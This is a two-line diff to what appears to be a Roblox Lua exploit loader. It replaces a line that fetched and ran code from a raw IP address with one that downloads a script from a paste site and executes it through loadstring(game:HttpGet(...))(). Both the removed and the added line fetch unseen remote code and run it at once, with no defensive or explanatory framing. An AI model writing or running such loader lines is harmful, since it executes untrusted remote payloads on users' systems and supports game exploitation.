@@ -1,2 +1,1 @@
-ID="710689bd-4fbb-4673-bbbd-1166dabdf0de";
-loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
+loadstring(game:HttpGet("https://paste.debian.net/plainh/5564c7c5/", true))()
